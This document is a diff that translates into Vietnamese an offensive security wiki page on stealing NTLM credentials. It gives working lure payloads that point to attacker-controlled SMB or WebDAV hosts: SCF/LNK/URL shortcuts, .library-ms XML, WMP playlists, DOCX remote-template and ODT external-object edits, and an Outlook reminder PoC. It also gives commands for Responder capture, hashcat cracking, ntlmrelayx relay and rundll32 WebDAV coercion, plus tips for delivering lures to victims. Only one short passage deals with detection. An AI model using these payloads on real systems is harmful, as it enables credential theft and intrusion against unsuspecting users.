@@ -1,14 +1,14 @@
-# Places to steal NTLM creds
+# Những nơi có thể đánh cắp thông tin đăng nhập NTLM
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Check all the great ideas from [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) from the download of a microsoft word file online to the ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
+**Xem tất cả ý tưởng tuyệt vời tại [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), từ việc tải một tệp Microsoft Word trực tuyến đến nguồn ntlm leaks: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md và [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 
-### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
+### Share SMB có quyền ghi + mồi UNC được Explorer kích hoạt (ntlm_theft/SCF/LNK/library-ms/desktop.ini)
 
-If you can **write to a share that users or scheduled jobs browse in Explorer**, drop files whose metadata points to your UNC (e.g. `\\ATTACKER\share`). Rendering the folder triggers **implicit SMB authentication** and leaks a **NetNTLMv2** to your listener.<sup>[[1]](#references)</sup>
+Nếu bạn có thể **ghi vào một share mà người dùng hoặc các tác vụ theo lịch duyệt bằng Explorer**, hãy thả vào đó các tệp có metadata trỏ đến UNC của bạn (ví dụ: `\\ATTACKER\share`). Việc hiển thị thư mục sẽ kích hoạt **xác thực SMB ngầm** và làm lộ **NetNTLMv2** đến listener của bạn.<sup>[[1]](#references)</sup>
 
-1. **Generate lures** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
+1. **Tạo mồi** (hỗ trợ SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/v.v.)
 
 ```bash
 git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
@@ -16,7 +16,7 @@ uv add --script ntlm_theft.py xlsxwriter
 uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
 ```
 
-2. **Drop them on the writable share** (any folder the victim opens):
+2. **Đặt chúng vào writable share** (bất kỳ thư mục nào nạn nhân mở):
 
 ```bash
 smbclient //victim/share -U 'guest%'
@@ -25,20 +25,20 @@ prompt off
 mput lure/*
 ```
 
-3. **Listen and crack**:
+3. **Nghe và crack**:
 
 ```bash
 sudo responder -I <iface>          # capture NetNTLMv2
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
 ```
 
-Windows may hit several files at once; anything Explorer previews (`BROWSE TO FOLDER`) requires no clicks.
+Windows có thể truy cập nhiều tệp cùng lúc; mọi thứ Explorer xem trước (`BROWSE TO FOLDER`) đều không cần nhấp.
 
-### Windows Media Player playlists (.ASX/.WAX)
+### Danh sách phát Windows Media Player (.ASX/.WAX)
 
-If you can get a target to open or preview a Windows Media Player playlist you control, you can leak Net‑NTLMv2 by pointing the entry to a UNC path. WMP will attempt to fetch the referenced media over SMB and will authenticate implicitly.<sup>[[3]](#references)[[4]](#references)</sup>
+Nếu bạn có thể khiến mục tiêu mở hoặc xem trước danh sách phát Windows Media Player do bạn kiểm soát, bạn có thể leak Net‑NTLMv2 bằng cách trỏ mục phát đến một đường dẫn UNC. WMP sẽ cố tải nội dung media được tham chiếu qua SMB và tự động xác thực.<sup>[[3]](#references)[[4]](#references)</sup>
 
-Example payload:
+Payload ví dụ:
 
 ```xml
 <asx version="3.0">
@@ -50,7 +50,7 @@ Example payload:
 </asx>
 ```
 
-Collection and cracking flow:
+Quy trình thu thập và cracking:
 
 ```bash
 # Capture the authentication
@@ -60,11 +60,11 @@ sudo Responder -I <iface>
 hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
 
-### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)
+### NTLM leak từ .library-ms nhúng trong ZIP (CVE-2025-24071/24055)
 
-Windows Explorer insecurely handles .library-ms files when they are opened directly from within a ZIP archive. If the library definition points to a remote UNC path (e.g., \\attacker\share), simply browsing/launching the .library-ms inside the ZIP causes Explorer to enumerate the UNC and emit NTLM authentication to the attacker. This yields a NetNTLMv2 that can be cracked offline or potentially relayed.<sup>[[2]](#references)</sup>
+Windows Explorer xử lý không an toàn các tệp .library-ms khi chúng được mở trực tiếp bên trong kho lưu trữ ZIP. Nếu định nghĩa thư viện trỏ đến một đường dẫn UNC từ xa (ví dụ: \\attacker\share), chỉ cần duyệt/mở .library-ms bên trong ZIP là Explorer sẽ liệt kê UNC và gửi thông tin xác thực NTLM đến attacker. Kết quả là thu được NetNTLMv2, có thể crack offline hoặc có khả năng relay.<sup>[[2]](#references)</sup>
 
-Minimal .library-ms pointing to an attacker UNC
+Tệp .library-ms tối giản trỏ đến UNC của attacker
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -86,17 +86,17 @@ Minimal .library-ms pointing to an attacker UNC
 </libraryDescription>
 ```
 
-Operational steps
-- Create the .library-ms file with the XML above (set your IP/hostname).
-- Zip it (on Windows: Send to → Compressed (zipped) folder) and deliver the ZIP to the target.
-- Run an NTLM capture listener and wait for the victim to open the .library-ms from inside the ZIP.
+Các bước thực hiện
+- Tạo tệp .library-ms bằng XML ở trên (đặt IP/hostname của bạn).
+- Nén tệp thành ZIP (trên Windows: Send to → Compressed (zipped) folder) rồi gửi ZIP cho mục tiêu.
+- Chạy NTLM capture listener và chờ nạn nhân mở tệp .library-ms bên trong ZIP.
 
 
-### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak
+### Đường dẫn âm thanh nhắc lịch Outlook (CVE-2023-23397) – leak Net-NTLMv2 zero-click
 
-Microsoft Outlook for Windows processed the extended MAPI property PidLidReminderFileParameter in calendar items. If that property points to a UNC path (e.g., \\attacker\share\alert.wav), Outlook would contact the SMB share when the reminder fires, leaking the user’s Net‑NTLMv2 without any click. This was patched on March 14, 2023, but it’s still highly relevant for legacy/untouched fleets and for historical incident response.<sup>[[5]](#references)</sup>
+Microsoft Outlook for Windows xử lý thuộc tính MAPI mở rộng PidLidReminderFileParameter trong các mục lịch. Nếu thuộc tính này trỏ đến đường dẫn UNC (ví dụ: \\attacker\share\alert.wav), Outlook sẽ kết nối đến SMB share khi lời nhắc được kích hoạt, làm lộ Net-NTLMv2 của người dùng mà không cần nhấp chuột. Lỗi này đã được vá vào ngày 14 tháng 3 năm 2023, nhưng vẫn rất đáng lưu ý đối với các hệ thống cũ/chưa được cập nhật và trong quá trình ứng phó sự cố lịch sử.<sup>[[5]](#references)</sup>
 
-Quick exploitation with PowerShell (Outlook COM):
+Khai thác nhanh bằng PowerShell (Outlook COM):
 
 ```powershell
 # Run on a host with Outlook installed and a configured mailbox
@@ -105,22 +105,22 @@ Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\
 # Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
 ```
 
-Listener side:
+Phía listener:
 
 ```bash
 sudo responder -I eth0  # or impacket-smbserver to observe connections
 ```
 
-Notes
-- A victim only needs Outlook for Windows running when the reminder triggers.
-- The leak yields Net‑NTLMv2 suitable for offline cracking or relay (not pass‑the‑hash).
+Ghi chú
+- Nạn nhân chỉ cần mở Outlook for Windows khi lời nhắc được kích hoạt.
+- Leak thu được Net‑NTLMv2, phù hợp để crack offline hoặc relay (không phải pass-the-hash).
 
 
-### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)
+### Leak NTLM zero-click dựa trên biểu tượng .LNK/.URL (CVE‑2025‑50154 – bypass CVE‑2025‑24054)
 
-Windows Explorer renders shortcut icons automatically. Recent research showed that even after Microsoft’s April 2025 patch for UNC‑icon shortcuts, it was still possible to trigger NTLM authentication with no clicks by hosting the shortcut target on a UNC path and keeping the icon local (patch bypass assigned CVE‑2025‑50154). Merely viewing the folder causes Explorer to retrieve metadata from the remote target, emitting NTLM to the attacker SMB server.<sup>[[6]](#references)</sup>
+Windows Explorer tự động hiển thị biểu tượng shortcut. Nghiên cứu gần đây cho thấy ngay cả sau bản vá tháng 4 năm 2025 của Microsoft dành cho shortcut có biểu tượng UNC, vẫn có thể kích hoạt xác thực NTLM mà không cần nhấp chuột bằng cách lưu trữ đích shortcut trên đường dẫn UNC và giữ biểu tượng ở cục bộ (lỗ hổng bypass bản vá được gán mã CVE‑2025‑50154). Chỉ cần xem thư mục là Explorer sẽ truy xuất metadata từ đích từ xa, gửi NTLM đến máy chủ SMB của attacker.<sup>[[6]](#references)</sup>
 
-Minimal Internet Shortcut payload (.url):
+Payload Internet Shortcut tối giản (.url):
 
 ```ini
 [InternetShortcut]
@@ -129,7 +129,7 @@ IconFile=\\10.10.14.2\share\icon.ico
 IconIndex=0
 ```
 
-Program Shortcut payload (.lnk) via PowerShell:
+Tạo payload Shortcut (.lnk) bằng PowerShell:
 
 ```powershell
 $lnk = "$env:USERPROFILE\Desktop\lab.lnk"
@@ -140,53 +140,53 @@ $sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass U
 $sc.Save()
 ```
 
-Delivery ideas
-- Drop the shortcut in a ZIP and get the victim to browse it.
-- Place the shortcut on a writable share the victim will open.
-- Combine with other lure files in the same folder so Explorer previews the items.
+Ý tưởng phát tán
+- Đặt shortcut vào ZIP rồi dụ nạn nhân mở ZIP.
+- Đặt shortcut trên share có quyền ghi mà nạn nhân sẽ mở.
+- Đặt thêm các file mồi khác trong cùng thư mục để Explorer xem trước các mục đó.
 
-### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)
+### No-click .LNK leak NTLM qua đường dẫn icon ExtraData (CVE‑2026‑25185)
 
-Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.
+Windows tải metadata của `.lnk` khi **xem/xem trước** (render icon), không chỉ khi thực thi. CVE‑2026‑25185 cho thấy một đường xử lý trong đó các khối **ExtraData** khiến shell phân giải đường dẫn icon và truy cập filesystem **trong quá trình tải**, từ đó phát sinh NTLM gửi ra ngoài nếu đường dẫn là đường dẫn từ xa.
 
-Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
-- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
-- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
-- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.
+Các điều kiện kích hoạt chính (quan sát được trong `CShellLink::_LoadFromStream`):
+- Thêm **DARWIN_PROPS** (`0xa0000006`) vào ExtraData (điều kiện để gọi routine cập nhật icon).
+- Thêm **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) với **TargetUnicode** được điền.
+- Loader mở rộng các biến môi trường trong `TargetUnicode` rồi gọi `PathFileExistsW` trên đường dẫn thu được.
 
-If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.<sup>[[7]](#references)</sup>
+Nếu `TargetUnicode` phân giải thành đường dẫn UNC (ví dụ: `\\attacker\share\icon.ico`), **chỉ cần xem một thư mục** có chứa shortcut là đủ khiến thông tin xác thực được gửi ra ngoài. Đường xử lý này cũng có thể bị kích hoạt bởi **indexing** và **AV scanning**, khiến đây trở thành bề mặt leak thực tế không cần nhấp.<sup>[[7]](#references)</sup>
 
-Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.<sup>[[8]](#references)</sup>
+Có sẵn công cụ nghiên cứu (parser/generator/UI) trong dự án **LnkMeMaybe** để tạo/kiểm tra các cấu trúc này mà không cần dùng Windows GUI.<sup>[[8]](#references)</sup>
 
 
-### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`
+### WebDAV auth coercion / xác thực credential qua `davclnt.dll,DavSetCookie`
 
-The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
+**WebDAV client** gốc có thể bị lợi dụng để buộc phiên đăng nhập hiện tại xác thực với một endpoint **HTTP/WebDAV** bất kỳ:
 
 ```cmd
 rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
 ```
 
-Why this is useful:
-- Against an **attacker-controlled WebDAV server**, it can trigger **NTLM over HTTP** without dropping a custom client.
-- Against **internal hosts**, it is a quiet way to **validate where stolen credentials are accepted** before moving laterally.<sup>[[9]](#references)</sup>
-- The command is a good alternative when **SMB egress is filtered** but **HTTP/WebDAV** is still reachable.
+Vì sao cách này hữu ích:
+- Với **WebDAV server do attacker kiểm soát**, cách này có thể kích hoạt **NTLM over HTTP** mà không cần triển khai client tùy chỉnh.
+- Với **host nội bộ**, đây là cách kín đáo để **xác thực nơi nào chấp nhận credentials bị đánh cắp** trước khi lateral movement.<sup>[[9]](#references)</sup>
+- Lệnh này là một lựa chọn thay thế tốt khi **SMB egress bị lọc** nhưng **HTTP/WebDAV** vẫn truy cập được.
 
-Operational notes:
-- The **WebClient** service must be running on the source host.
-- `rundll32.exe` loads `davclnt.dll` and makes Windows handle the WebDAV authentication using the **current user's credentials**.<sup>[[10]](#references)</sup>
-- If you point it to infrastructure you control, use an NTLM-aware HTTP listener/relay such as:
+Lưu ý khi vận hành:
+- Dịch vụ **WebClient** phải đang chạy trên host nguồn.
+- `rundll32.exe` tải `davclnt.dll` và để Windows xử lý xác thực WebDAV bằng **credentials của người dùng hiện tại**.<sup>[[10]](#references)</sup>
+- Nếu trỏ đến hạ tầng do bạn kiểm soát, hãy dùng HTTP listener/relay có hỗ trợ NTLM như:
 
 ```bash
 # Capture or relay NTLM over HTTP/WebDAV
 ntlmrelayx.py -t smb://<TARGET> --http-port 80
 ```
 
-From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normal user behaviour.<sup>[[9]](#references)[[11]](#references)</sup>
+Từ góc độ phát hiện, việc `rundll32.exe davclnt.dll,DavSetCookie` liên tục thực thi trên nhiều hệ thống nội bộ là dấu hiệu rõ ràng của **việc kiểm tra thông tin xác thực / chuẩn bị di chuyển ngang kiểu spray**, chứ không phải hành vi người dùng thông thường.<sup>[[9]](#references)[[11]](#references)</sup>
 
-### Remote notification URIs for WebDAV NTLM coercion
+### URI thông báo từ xa để ép xác thực NTLM qua WebDAV
 
-If an application dereferences remotely configured popup or web-view addresses, a `file://` address can coerce outbound authentication **without a document open or executable payload**. In the AOMEI case, a one-pixel notification pointed to a remote `DavWWWRoot` WebDAV path. Windows attempted integrated authentication to that address, exposing a NetNTLMv2 challenge-response. The trigger was URI dereferencing, not popup visibility; it still depends on the application's URI handler, [Windows WebClient behavior](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution), and outbound authentication policy.<sup>[[16]](#references)</sup>
+Nếu một ứng dụng truy cập các địa chỉ popup hoặc web-view được cấu hình từ xa, địa chỉ `file://` có thể ép xác thực gửi đi **mà không cần mở tài liệu hay payload thực thi**. Trong trường hợp AOMEI, thông báo một pixel trỏ đến đường dẫn WebDAV `DavWWWRoot` từ xa. Windows đã thử xác thực tích hợp với địa chỉ đó, làm lộ phản hồi challenge-response NetNTLMv2. Kích hoạt đến từ việc truy cập URI, không phải do popup hiển thị; cách này vẫn phụ thuộc vào trình xử lý URI của ứng dụng, [hành vi Windows WebClient](../../network-services-pentesting/pentesting-web/put-method-webdav.md#client-side-webdav-delivery-and-execution) và chính sách xác thực gửi đi.<sup>[[16]](#references)</sup>
 
 ```ini
 [PopWindow1]
@@ -196,37 +196,37 @@ Height=1
 Priority=9999
 ```
 
-Unlike the command-based coercion above, this entry point requires control of a [software notification configuration](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). The one-pixel window and high priority show that an unobtrusive notification can still make the client dereference the URI.<sup>[[16]](#references)</sup>
+Khác với kỹ thuật ép xác thực dựa trên lệnh ở trên, điểm vào này đòi hỏi quyền kiểm soát [cấu hình thông báo phần mềm](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#notification-configuration-as-a-second-update-trigger). Cửa sổ một pixel và độ ưu tiên cao cho thấy một thông báo không gây chú ý vẫn có thể khiến client truy xuất tham chiếu URI.<sup>[[16]](#references)</sup>
 
-### Office remote template injection (.docx/.dotm) to coerce NTLM
+### Office remote template injection (.docx/.dotm) để ép NTLM
 
-Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.
+Tài liệu Office có thể tham chiếu đến một template bên ngoài. Nếu đặt template đính kèm thành đường dẫn UNC, việc mở tài liệu sẽ xác thực với SMB.
 
-Minimal DOCX relationship changes (inside word/):
+Các thay đổi tối thiểu đối với relationship của DOCX (bên trong word/):
 
-1) Edit word/settings.xml and add the attached template reference:
+1) Chỉnh sửa word/settings.xml và thêm tham chiếu đến template đính kèm:
 
 ```xml
 <w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
 ```
 
-2) Edit word/_rels/settings.xml.rels and point rId1337 to your UNC:
+2) Chỉnh sửa word/_rels/settings.xml.rels và trỏ rId1337 đến UNC của bạn:
 
 ```xml
 <Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
 ```
 
-3) Repack to .docx and deliver. Run your SMB capture listener and wait for the open.
+3) Đóng gói lại thành .docx và gửi đi. Chạy SMB capture listener của bạn và chờ tài liệu được mở.
 
-### ODT external object for SMB authentication
+### Đối tượng external trong ODT để xác thực SMB
 
-When a document-upload path accepts `.odt` but the target does not open Office `.docx` files, use an OpenDocument external object instead of an Office template. Metasploit's `auxiliary/fileformat/odt_badodt` generates an ODT whose `content.xml` contains an on-load `draw:object` reference like the one below. Set `LHOST` to the SMB listener, upload the ODT through the allowed workflow, and capture the outbound NetNTLMv2 response when a user or document processor opens it. A filename-extension check does not inspect this embedded URL; inbound NTLM restrictions on the target do not necessarily stop outbound authentication.<sup>[[15]](#references)</sup>
+Khi một quy trình tải tài liệu lên chấp nhận `.odt` nhưng mục tiêu không mở tệp Office `.docx`, hãy dùng đối tượng external của OpenDocument thay cho Office template. Metasploit's `auxiliary/fileformat/odt_badodt` tạo ODT có `content.xml` chứa tham chiếu `draw:object` khi mở, như ví dụ bên dưới. Đặt `LHOST` thành SMB listener, tải ODT lên theo quy trình được phép và capture phản hồi NetNTLMv2 gửi ra ngoài khi người dùng hoặc bộ xử lý tài liệu mở tệp. Kiểm tra phần mở rộng tên tệp không kiểm tra URL được nhúng này; các hạn chế NTLM inbound trên mục tiêu không nhất thiết ngăn được việc xác thực outbound.<sup>[[15]](#references)</sup>
 
 ```xml
 <draw:object xlink:href="file://<attacker-ip>/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
 ```
 
-For post-capture ideas on relaying or abusing NTLM, check:
+Để xem các ý tưởng sau khi thu thập thông tin xác thực về việc relaying hoặc lạm dụng NTLM, hãy xem:
 
 {{#ref}}
 README.md
@@ -234,19 +234,19 @@ README.md
 
 
 ## References
-- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
-- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
-- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
-- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
-- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
-- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
-- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
-- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
-- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
-- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
-- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
-- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
+- [1] [HTB: Breach – Mồi nhử bằng share có quyền ghi + Responder capture → crack NetNTLMv2 → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
+- [2] [HTB Fluffy – leak xác thực qua ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 lên DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
+- [3] [HTB: Media — WMP làm lộ NTLM → NTFS junction đến webroot để RCE → FullPowers + GodPotato lên SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
+- [4] [Morphisec – 5 lỗ hổng NTLM: Các mối đe dọa leo thang đặc quyền chưa được vá trong Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
+- [5] [MSRC – Microsoft giảm thiểu lỗ hổng EoP trong Outlook (CVE‑2023‑23397) và giải thích việc làm lộ NTLM qua PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
+- [6] [Cymulate – Không cần tương tác, chỉ một NTLM: Vượt qua bản vá bảo mật của Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
+- [7] [TrustedSec – LnkMeMaybe: Đánh giá CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
+- [8] [Công cụ LnkMeMaybe của TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
+- [9] [Rapid7 – Khi bộ phận IT Support gọi đến: Phân tích chiến dịch ModeloRAT từ Teams đến xâm phạm Domain](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
+- [10] [Microsoft Learn – tệp header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
+- [11] [Splunk – Yêu cầu WebDAV từ Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
+- [12] [osandamalith.com - Các vị trí cần chú ý để đánh cắp hash NetNTLM](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
 - [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
 - [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
-- [15] [HTB: Hercules — ODT external-object NTLM capture](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
-- [16] [Google Threat Intelligence Group and Mandiant – Investigating Ephemeral Supply Chain Tampering](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
+- [15] [HTB: Hercules — Thu thập NTLM qua đối tượng bên ngoài trong ODT](https://0xdf.gitlab.io/2026/09/21/htb-hercules.html)
+- [16] [Google Threat Intelligence Group và Mandiant – Điều tra hành vi can thiệp nhất thời vào chuỗi cung ứng](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
